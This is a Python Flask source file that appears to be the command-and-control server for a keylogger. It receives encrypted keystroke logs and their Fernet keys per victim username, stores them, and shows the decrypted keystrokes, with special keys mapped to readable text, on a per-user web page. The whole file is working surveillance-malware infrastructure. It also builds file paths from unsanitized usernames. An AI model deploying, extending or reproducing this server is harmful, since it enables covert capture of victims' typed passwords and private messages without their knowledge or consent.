from flask import Flask, request, render_template, redirect, url_for
import os
from datetime import datetime
from cryptography.fernet import Fernet

app = Flask(__name__)

@app.route('/')
def index():
    users = os.listdir('logs')
    return render_template('index.html', users=users)

@app.route('/log', methods=['POST'])
def log():
    username = request.form.get('username', 'default_user')
    folder_name = f"logs/{username}"
    os.makedirs(folder_name, exist_ok=True)
    with open(f'{folder_name}/received_log.txt', 'a') as f:
        f.write(request.form['log'] + '\n')
    return 'Log received', 200

@app.route('/key', methods=['POST'])
def receive_key():
    username = request.form.get('username', 'default_user')
    folder_name = f"logs/{username}"
    os.makedirs(folder_name, exist_ok=True)
    with open(f'{folder_name}/received_key.txt', 'a') as f:
        f.write(request.form['key'] + '\n')
    return 'Key received', 200

@app.route('/user/<username>')
def user_logs(username):
    folder_name = f'logs/{username}'
    key_file = os.path.join(folder_name, 'received_key.txt')
    log_file = os.path.join(folder_name, 'received_log.txt')
    
    if not os.path.exists(key_file) or not os.path.exists(log_file):
        return render_template('user_logs.html', username=username, logs="No data sent yet.")

    with open(key_file, 'r') as f:
        encryption_key = f.read().strip()
        cipher_system = Fernet(encryption_key)
        
    key_dict = {
        'Key.enter': '<br>',
        'Key.space': ' ',
        'Key.tab': '&emsp;',
        'Key.backspace': '[BACKSPACE]',
        'Key.shift': '[SHIFT]',
        'Key.ctrl_l': '[CTRL]',
        'Key.alt_l': '[ALT]',
        'Key.esc': '[ESC]',
        'Key.up': '[UP]',
        'Key.down': '[DOWN]',
        'Key.left': '[LEFT]',
        'Key.right': '[RIGHT]',
        'Key.caps_lock': '[CAPSLOCK]'
    }

    def clean_key_log(key):
        return key_dict.get(key, key.replace('Key.', ''))

    with open(log_file, 'r') as f:
        encrypted_logs = f.readlines()

    decrypted_logs = []
    for log in encrypted_logs:
        try:
            decrypted_log = cipher_system.decrypt(log.strip().encode()).decode('utf-8')
            cleaned_log = clean_key_log(decrypted_log)
            decrypted_logs.append(cleaned_log)
        except Exception as e:
            decrypted_logs.append(f"[ERROR] {str(e)}")

    return render_template('user_logs.html', username=username, logs="".join(decrypted_logs))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
